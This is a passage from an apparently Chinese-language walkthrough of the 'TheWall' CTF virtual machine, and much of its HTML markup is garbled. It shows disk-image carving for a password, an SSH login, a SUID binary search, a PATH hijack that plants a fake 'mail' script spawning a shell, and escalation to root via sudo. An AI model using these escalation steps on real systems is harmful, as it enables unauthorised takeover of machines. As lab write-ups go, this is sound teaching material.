&lt;p&gt;<span class="p">&amp;</span>ldquo<span class="p">;</span>Syd<span class="p">&amp;</span>rdquo<span class="p">;</span></code></pre></div></p>

<p>檢查eclipsed_by_the_moon之後會發現他其實是個gz檔</p>

<p>解壓縮後會得到一個用tar壓縮的檔案，再換tar解壓縮一次</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall/ec# file eclipsed_by_the_moon.lsd
eclipsed_by_the_moon.lsd: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID <span class="p">&amp;</span>ldquo<span class="p">;</span>MSDOS5.0<span class="p">&amp;</span>rdquo<span class="p">;</span>, sectors/cluster 2, reserved sectors 8, root entries 512, Media descriptor 0xf8, sectors/FAT 188, sectors/track 63, heads 255, hidden sectors 2048, sectors <span class="m">96256</span> <span class="o">(</span>volumes &gt; <span class="m">32</span> MB<span class="o">)</span> , serial number 0x9e322180, unlabeled, FAT <span class="o">(</span><span class="m">16</span> bit<span class="o">)</span></code></pre></div></p>

<p>最後得到一個lsd檔</p>

<p>研究一下scalpel的用法之後，到/etc/scalpel/scalpel.conf把想要搜尋的檔案類型打開</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# scalpel eclipsed_by_the_moon.lsd
Scalpel version 1.60
Written by Golden G. Richard III, based on Foremost 0.69.&lt;/p&gt;

&lt;p&gt;Opening target <span class="p">&amp;</span>ldquo<span class="p">;</span>/root/Security/wall/eclipsed_by_the_moon.lsd<span class="p">&amp;</span>rdquo<span class="p">;</span>&lt;/p&gt;

&lt;p&gt;Image file pass <span class="p">&amp;</span>frac12<span class="p">;</span>.
eclipsed_by_the_moon.lsd: 100.0% <span class="p">|</span>&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>   47.0 MB    00:00 ETAAllocating work queues<span class="p">&amp;</span>hellip<span class="p">;</span>
Work queues allocation complete. Building carve lists<span class="p">&amp;</span>hellip<span class="p">;</span>
Carve lists built.  Workload:
jpg with header <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="se">\x</span>ff<span class="se">\x</span>d8<span class="se">\x</span>ff<span class="se">\x</span>e0<span class="se">\x</span>00<span class="se">\x</span>10<span class="p">&amp;</span>rdquo<span class="p">;</span> and footer <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="se">\x</span>ff<span class="se">\x</span>d9<span class="p">&amp;</span>rdquo<span class="p">;</span> <span class="p">&amp;</span>ndash<span class="p">;</span>&gt; <span class="m">1</span> files
Carving files from image.
Image file pass 2/2.
eclipsed_by_the_moon.lsd: 100.0% <span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;<span class="p">|</span>   47.0 MB    00:00 ETAProcessing of image file complete. Cleaning up<span class="p">&amp;</span>hellip<span class="p">;</span>
Done.
Scalpel is <span class="k">done</span>, files <span class="nv">carved</span> <span class="o">=</span> 1, <span class="nv">elapsed</span> <span class="o">=</span> <span class="m">0</span> seconds.</code></pre></div></p>

<p><img class="center" src="/images/2015-12-19-thewall-1/roger_waters.png"></p>

<p>拿到了Roger Waters的密碼，再用他的帳號登入ssh看看</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall/roger_waters# ssh &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#x61;&amp;#105;&amp;#108;&amp;#x74;&amp;#x6f;&amp;#58;&amp;#82;&amp;#x6f;&amp;#x67;&amp;#101;&amp;#x72;&amp;#x57;&amp;#x61;&amp;#x74;&amp;#101;&amp;#x72;&amp;#x73;&amp;#x40;&amp;#x31;&amp;#x39;&amp;#50;&amp;#x2e;&amp;#x31;&amp;#54;&amp;#56;&amp;#46;&amp;#48;&amp;#x2e;&amp;#x31;&amp;#x31;&amp;#x36;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x52;&amp;#111;&amp;#x67;&amp;#x65;&amp;#x72;&amp;#87;&amp;#97;&amp;#x74;&amp;#101;&amp;#x72;&amp;#115;&amp;#x40;&amp;#x31;&amp;#x39;&amp;#x32;&amp;#46;&amp;#49;&amp;#x36;&amp;#x38;&amp;#46;&amp;#48;&amp;#46;&amp;#x31;&amp;#49;&amp;#54;&lt;/a&gt; -p1965</span>
&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#97;&amp;#105;&amp;#x6c;&amp;#x74;&amp;#111;&amp;#x3a;&amp;#x52;&amp;#x6f;&amp;#x67;&amp;#101;&amp;#114;&amp;#x57;&amp;#97;&amp;#x74;&amp;#101;&amp;#x72;&amp;#115;&amp;#64;&amp;#49;&amp;#57;&amp;#x32;&amp;#x2e;&amp;#49;&amp;#54;&amp;#x38;&amp;#46;&amp;#48;&amp;#x2e;&amp;#x31;&amp;#x31;&amp;#x36;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#82;&amp;#111;&amp;#x67;&amp;#101;&amp;#x72;&amp;#x57;&amp;#x61;&amp;#116;&amp;#x65;&amp;#x72;&amp;#115;&amp;#64;&amp;#x31;&amp;#57;&amp;#x32;&amp;#x2e;&amp;#49;&amp;#54;&amp;#x38;&amp;#46;&amp;#48;&amp;#x2e;&amp;#49;&amp;#49;&amp;#x36;&lt;/a&gt;&amp;rsquo;s password:</span>
Permission denied, please try again.
&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#x61;&amp;#x69;&amp;#108;&amp;#116;&amp;#111;&amp;#x3a;&amp;#82;&amp;#111;&amp;#103;&amp;#101;&amp;#114;&amp;#87;&amp;#x61;&amp;#x74;&amp;#x65;&amp;#114;&amp;#x73;&amp;#64;&amp;#49;&amp;#x39;&amp;#x32;&amp;#46;&amp;#49;&amp;#54;&amp;#x38;&amp;#x2e;&amp;#48;&amp;#x2e;&amp;#x31;&amp;#49;&amp;#54;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x52;&amp;#x6f;&amp;#103;&amp;#101;&amp;#x72;&amp;#87;&amp;#97;&amp;#116;&amp;#x65;&amp;#x72;&amp;#115;&amp;#x40;&amp;#49;&amp;#57;&amp;#50;&amp;#46;&amp;#49;&amp;#x36;&amp;#56;&amp;#x2e;&amp;#48;&amp;#46;&amp;#x31;&amp;#x31;&amp;#54;&lt;/a&gt;&amp;rsquo;s password:</span>
Permission denied, please try again.
&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#97;&amp;#105;&amp;#108;&amp;#x74;&amp;#111;&amp;#58;&amp;#x52;&amp;#111;&amp;#103;&amp;#x65;&amp;#114;&amp;#x57;&amp;#97;&amp;#x74;&amp;#101;&amp;#x72;&amp;#115;&amp;#x40;&amp;#49;&amp;#x39;&amp;#x32;&amp;#x2e;&amp;#49;&amp;#x36;&amp;#x38;&amp;#x2e;&amp;#x30;&amp;#x2e;&amp;#49;&amp;#49;&amp;#x36;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x52;&amp;#111;&amp;#x67;&amp;#x65;&amp;#114;&amp;#87;&amp;#97;&amp;#x74;&amp;#x65;&amp;#x72;&amp;#115;&amp;#64;&amp;#x31;&amp;#x39;&amp;#50;&amp;#46;&amp;#49;&amp;#54;&amp;#x38;&amp;#46;&amp;#48;&amp;#x2e;&amp;#49;&amp;#x31;&amp;#54;&lt;/a&gt;&amp;rsquo;s password:</span>
OpenBSD 5.8 <span class="o">(</span>GENERIC<span class="o">)</span> <span class="c">#1066: Sun Aug 16 02:33:00 MDT 2015&lt;/p&gt;</span>

&lt;pre&gt;&lt;code&gt;                   .u!<span class="s2">&quot;`</span>
<span class="s2">               .x*&quot;</span><span class="sb">`</span>
           ..+<span class="s2">&quot;NP</span>
<span class="s2">        .z&quot;&quot;   ?</span>
<span class="s2">      M#`      9     ,     ,</span>
<span class="s2">               9 M  d! ,8P&#39;</span>
<span class="s2">               R X.:x&#39; R&#39;  ,</span>
<span class="s2">               F F&#39; M  R.d&#39;</span>
<span class="s2">               d P  @  E`  ,</span>
<span class="s2">  ss           P  &#39;  P  N.d&#39;</span>
<span class="s2">   x         &#39;&#39;        &#39;</span>
<span class="s2">   X               x             .</span>
<span class="s2">   9     .f       !         .    $b</span>
<span class="s2">   4;    $k      /         dH    $f</span>
<span class="s2">   &#39;X   ;$$     z  .       MR   :$</span>
<span class="s2">    R   M$$,   :  d9b      M&#39;   tM</span>
<span class="s2">    M:  #&#39;$L  ;&#39; M `8      X    MR</span>
<span class="s2">    `$;t&#39; $F  # X ,oR      t    Q;</span>
<span class="s2">     $$@  R$ H :RP&#39; $b     X    @&#39;</span>
<span class="s2">     9$E  @Bd&#39; $&#39;   ?X     ;    W</span>
<span class="s2">     `M&#39;  `$M d$    `E    ;.o* :R   ..</span>
<span class="s2">      `    &#39;  &quot;</span><span class="s1">&#39;     &#39;</span>    @<span class="s1">&#39;   &#39;</span><span class="nv">$o</span>*<span class="err">&quot;&#39;</span>
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;<span class="nv">$ </span>uname -a
OpenBSD thewall.localdomain 5.8 GENERIC#1066 i386
<span class="nv">$ </span>id
<span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>RogerWaters<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>RogerWaters<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>RogerWaters<span class="o">)</span></code></pre></div></p>

<p>終於成功拿到shell了，接下來要找提權的方法</p>

<p>研究一下之後發現系統上有五個使用者，目前已經拿到兩個使用者的權限，推測大概要把五個都走完</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>cat /etc/passwd
<span class="p">&amp;</span>hellip<span class="p">;</span>
SydBarrett:&lt;em&gt;:1000:1000:Syd Barrett:/home/SydBarrett:/sbin/nologin
NickMason:&lt;/em&gt;:1001:1001:Nick Mason:/home/NickMason:/bin/ksh
RogerWaters:&lt;em&gt;:1002:1002:Roger Waters:/home/RogerWaters:/bin/ksh
RichardWright:&lt;/em&gt;:1003:1003:Richard Wright:/home/RichardWright:/bin/ksh
DavidGilmour:*:1004:1004:David Gilmour:/home/DavidGilmour:/bin/ksh</code></pre></div></p>

<p>接著找看看系統上特別設定stick bit的檔案</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span><span class="k">for</span> i in <span class="k">$(</span>find / -perm -4000 2&gt;/dev/null<span class="k">)</span><span class="p">;</span> <span class="k">do</span> ls -al <span class="nv">$i</span><span class="p">;</span> <span class="k">done</span>
<span class="p">&amp;</span>hellip<span class="p">;</span>
-rws<span class="p">&amp;</span>ndash<span class="p">;</span>s<span class="p">&amp;</span>ndash<span class="p">;</span>x  <span class="m">1</span> NickMason  NickMason  <span class="m">7291</span> Aug  <span class="m">8</span> 00:33 /usr/local/bin/brick
-rwsr-s<span class="p">&amp;</span>mdash<span class="p">;</span>  <span class="m">1</span> DavidGilmour  RichardWright  <span class="m">7524</span> Oct <span class="m">25</span> 07:58 /usr/local/bin/shineon</code></pre></div></p>

<p>找到了兩個檔案，不過可以執行的只有/usr/local/bin/brick</p>

<p>執行之後回答問題就能拿到NickMason的權限</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>/usr/local/bin/brick
<span class="p">&amp;</span>hellip<span class="p">;</span>
Who is the only band member to be featured on every Pink Floyd album? : Nick Mason
/bin/sh: Cannot determine current working directory
<span class="nv">$ </span>id
<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>NickMason<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>NickMason<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>RogerWaters<span class="o">)</span></code></pre></div></p>

<p>在NickMason的家目錄底下逛不到甚麼結果，就把nick_mason_profile_pic.jpg傳回攻擊端</p>

<p>本來以為是張圖片，結果定睛一看是個ogg檔</p>

<p>播放之後，會聽到一段夾雜著應該是摩斯密碼的旋律</p>

<p>可以直接用聽的方式來解，不過為了避免浪費時間，還是丟到Sonic Visualizer讓他圖型化比較保險XD</p>

<p><img class="center" src="/images/2015-12-19-thewall-1/morse_code.png"></p>

<p>最後得到 richardwright1943farfisa</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>su RichardWright
Password:
ksh: Cannot determine current working directory
<span class="nv">$ </span>id
<span class="nv">uid</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span>
<span class="err">$</span></code></pre></div></p>

<p>接著以RichardWright的權限執行/usr/local/bin/shineon</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>/usr/local/bin/shineon
Menu&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Calendar&lt;/li&gt;
&lt;li&gt;Who&lt;/li&gt;
&lt;li&gt;Check Internet&lt;/li&gt;
&lt;li&gt;Check Mail&lt;/li&gt;
&lt;li&gt;Exit</code></pre></div></li>
</ol>


<p>測試過後發現都是執行linux內建的程式</p>

<p>稍微用strings檢查一下/usr/local/bin/shineon</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>strings /usr/local/bin/shineon
<span class="p">&amp;</span>hellip<span class="p">;</span>
Time - The Dark Side of the Moon
/usr/bin/cal
Press ENTER to <span class="k">continue</span>.
Echoes - Meddle
/usr/bin/who
Is There Anybody Out There? - The Wall
/sbin/ping -c <span class="m">3</span> www.google.com
Keep Talking- The Division Bell
mail</code></pre></div></p>

<p>看來除了mail以外，其他都是用絕對路徑執行程式，推測這邊可以修改PATH來達到SUID的效果</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
/home/RogerWaters/bin:/bin:/sbin:/usr/bin:/usr/sbin:/usr/X11R6/bin:/usr/local/bin:/usr/local/sbin:/usr/games:.</code></pre></div></p>

<p>這邊看到/home/RogerWaters/bin已經排在$PATH的最前面了</p>

<p>再來就是切回RogerWaters的帳號，在bin的目錄建立一個假的mail</p>

<p>不過因為RogerWaters的家目錄不是公開的，還要另外開放權限才能讓其他帳號使用</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>mkdir bin
<span class="nv">$ </span><span class="nb">cd </span>bin
<span class="nv">$ </span><span class="nb">echo</span> <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="c">#!/usr/local/bin/python&amp;rsquo; &gt; mail</span>
<span class="nv">$ </span><span class="nb">echo</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>import pty<span class="p">&amp;</span>rsquo<span class="p">;</span> &gt;&gt; mail
<span class="nv">$ </span><span class="nb">echo</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>pty.spawn<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>/bin/sh<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span><span class="p">&amp;</span>rsquo<span class="p">;</span> &gt;&gt; mail
<span class="nv">$ </span>chmod +x mail</code></pre></div></p>

<p>設定完就切回RichardWright，再執行一次/usr/local/bin/shineon，就拿到DavidGilmour的群組權限了</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>/usr/local/bin/shineon
Menu&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Calendar&lt;/li&gt;
&lt;li&gt;Who&lt;/li&gt;
&lt;li&gt;Check Internet&lt;/li&gt;
&lt;li&gt;Check Mail&lt;/li&gt;
&lt;li&gt;Exit
4
Keep Talking- The Division Bell
/bin/sh: Cannot determine current working directory
<span class="nv">$ </span>id
<span class="nv">uid</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span>
<span class="err">$</span></code></pre></div></li>
</ol>


<p>在DavidGilmour的家目錄下發現一個anotherbrick.txt，裡面提供了一串網址</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>cat anotherbrick.txt&lt;/p&gt;

&lt;h1&gt;Come on you raver, you seer of visions, come on you painter, you piper, you prisoner, and shine. - Pink Floyd, Shine On You Crazy Diamond&lt;/h1&gt;

&lt;p&gt;New website <span class="k">for</span> review:    pinkfloyd1965newblogsite50yearscelebration-temp/index.php&lt;/p&gt;

&lt;h1&gt;You have to be trusted by the people you lie to. So that when they turn their backs on you, you<span class="p">&amp;</span>rsquo<span class="p">;</span>ll get the chance to put the knife in. - Pink Floyd, Dogs&lt;/h1&gt;

&lt;p&gt;<span class="err">$</span></code></pre></div></p>

<p>連上網頁後，在程式碼最後有一行註解</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;/p&gt;

&lt;!--Through the window in the wall, come streaming in on sunlight wings, a million bright ambassadors of morning. - Pink Floyd, Echoes
Can you see what the Dog sees? Perhaps hints of lightness streaming in on sunlight wings?--&gt;


&lt;p&gt;</code></pre></div></p>

<p><img class="center" src="/images/2015-12-19-thewall-1/dog.png"></p>

<p>這隻狗下面貌似有兩排字，調整亮度跟對比後會得到</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">/welcometothemachine
50696e6b466c6f796435305965617273</code></pre></div></p>

<p>50696e6b466c6f796435305965617273用hex解碼後會得到PinkFloyd50Years</p>

<p>而將/welcometothemachine輸入網址列後會得到403 Forbidden的結果</p>

<p>實際到/var/www目錄後，看到htdocs的群組權限是指定給welcometothemachine</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>id
<span class="nv">uid</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span>
<span class="nv">$ </span>cat /etc/group
welcometothemachine:*:1005:DavidGilmour</code></pre></div></p>

<p>在這邊卡了十分鐘之後，只好認命回家目錄再找找有沒有其他線索</p>

<p>最後在david_gilmour_profile_pic.jpg找到了一個字串</p>

<p>拿這當的密碼就能登入DavidGilmour的帳號了orz</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>strings david_gilmour_profile_pic.jpg
who_are_you_and_who_am_i
<span class="nv">$ </span>su DavidGilmour
Password:
<span class="nv">$ </span>id
<span class="nv">uid</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span>, 1<span class="o">(</span>daemon<span class="o">)</span>, 67<span class="o">(</span>www<span class="o">)</span>, 1005<span class="o">(</span>welcometothemachine<span class="o">)</span></code></pre></div></p>

<p>再回到剛剛的/var/www/htdocs，最後找到PinkFloyd這個執行檔</p>

<p>本來以為解碼過的字串是正確答案，結果原句輸入就得到了新的權限了orz</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>./PinkFloyd
Please send your answer to Old Pink, in care of the Funny Farm. - Pink Floyd, Empty Spaces
Answer: PinkFloyd50Years&lt;/p&gt;

&lt;p&gt;Denied<span class="p">&amp;</span>hellip<span class="p">;</span>.
If I had my way, I<span class="p">&amp;</span>rsquo<span class="p">;</span>d have all of ya shot. - Pink Floyd, In The Flesh
<span class="nv">$ </span>./PinkFloyd
Please send your answer to Old Pink, in care of the Funny Farm. - Pink Floyd, Empty Spaces
Answer: 50696e6b466c6f796435305965617273&lt;/p&gt;

&lt;p&gt;Fearlessly the idiot faced the crowd smiling. - Pink Floyd, Fearless&lt;/p&gt;

&lt;p&gt;Congratulations<span class="p">&amp;</span>hellip<span class="p">;</span> permission has been granted.
You can now <span class="nb">set </span>your controls to the heart of the sun!
<span class="nv">$ </span>id
<span class="nv">uid</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span>, 1<span class="o">(</span>daemon<span class="o">)</span>, 67<span class="o">(</span>www<span class="o">)</span>, 1005<span class="o">(</span>welcometothemachine<span class="o">)</span></code></pre></div></p>

<p>只是拿到daemon和www的權限之後有點無所適從，最後才發現其實是拿到了sudo的權限</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>sudo -l
Password:
Matching Defaults entries <span class="k">for</span> DavidGilmour on thewall:
    env_keep+<span class="o">=</span><span class="p">&amp;</span>ldquo<span class="p">;</span>FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK<span class="p">&amp;</span>rdquo<span class="p">;</span>&lt;/p&gt;

&lt;p&gt;User DavidGilmour may run the following commands on thewall:
    <span class="o">(</span>ALL<span class="o">)</span> SETENV: ALL
    <span class="o">(</span>ALL<span class="o">)</span> SETENV: ALL&lt;/p&gt;

&lt;p&gt;<span class="nv">$ </span>sudo su&lt;/p&gt;

&lt;h1&gt;id&lt;/h1&gt;

&lt;p&gt;uid<span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span>, 2<span class="o">(</span>kmem<span class="o">)</span>, 3<span class="o">(</span>sys<span class="o">)</span>, 4<span class="o">(</span>tty<span class="o">)</span>, 5<span class="o">(</span>operator<span class="o">)</span>, 20<span class="o">(</span>staff<span class="o">)</span>, 31<span class="o">(</span>guest<span class="o">)</span>&lt;/p&gt;

&lt;h1&gt;cat /root/flag.txt&lt;/h1&gt;

&lt;p&gt;<span class="p">&amp;</span>ldquo<span class="p">;</span>The band is fantastic, that is really what I think. Oh, by the way, which one is Pink? - Pink Floyd, Have A Cigar<span class="p">&amp;</span>rdquo<span class="p">;</span>&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;               Congratulations on rooting thewall!
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;p&gt;  <span class="p">|</span> <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span> <span class="p">|</span>
  <span class="p">|</span>&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;em&gt;&lt;strong&gt;&lt;strong&gt; <span class="p">&amp;</span>lsquo<span class="p">;</span>&lt;/strong&gt;  &lt;/strong&gt;&lt;/em&gt;<span class="p">|</span>&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;<span class="p">|</span>&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;<span class="p">|</span>&lt;em&gt;<span class="p">|</span>
  <span class="p">|</span>     <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>   <span class="p">|</span>  <span class="o">)</span>      /         <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>     <span class="p">|</span>
  <span class="p">|</span>&lt;/em&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;em&gt;&lt;em&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt; <span class="p">|</span>,<span class="p">&amp;</span>rsquo<span class="p">;</span> , .  <span class="p">|</span> <span class="p">|</span> _ , &lt;/em&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/em&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;<span class="p">|</span>
  <span class="p">|</span> <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>      ,<span class="p">|</span>   <span class="p">|</span> <span class="p">|</span><span class="se">\ </span><span class="p">|</span> <span class="p">|</span> ,<span class="p">&amp;</span>lsquo<span class="p">;</span> <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span> <span class="p">|</span>
  <span class="p">|</span>&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;em&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;__ <span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="p">|</span> _ <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|&amp;</span>lsquo<span class="p">;</span><span class="se">\ </span>&lt;/em&gt;<span class="p">|</span>&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;<span class="p">|</span>&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>
  <span class="p">|</span>     <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>   <span class="se">\ </span> &lt;em&gt;<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>  &lt;code&gt;<span class="p">|</span>  <span class="se">\ </span>    <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>     <span class="p">|</span>
  <span class="p">|</span>_____<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_  ,-<span class="s1">&#39;_ _____ | _______|_______|_______|_____|</span>
<span class="s1">  | |       |       |   ,-&#39;</span><span class="p">|</span>  _     <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span> <span class="p">|</span>
  <span class="p">|</span>_<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>__  ,-<span class="p">|</span>-<span class="s1">&#39; |  ,-. \ /_.--. _____|_______|_______|_|</span>
<span class="s1">  |     |       |          |   |  | |  V  |   ) |       |       |     |</span>
<span class="s1">  |_____|_______|_______|_ | _ |-&#39;</span>&lt;/code&gt;-<span class="p">&amp;</span>rsquo<span class="p">;</span>  <span class="p">|</span>  <span class="p">|</span> ,<span class="p">&amp;</span>lsquo<span class="p">;</span> &lt;/em&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;em&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;<span class="p">|</span>
  <span class="p">|</span> <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>      <span class="p">|</span>        <span class="p">|</span>  <span class="p">&amp;</span>rsquo<span class="p">;</span>  <span class="p">;&amp;</span>lsquo<span class="p">;</span>        <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span> <span class="p">|</span>
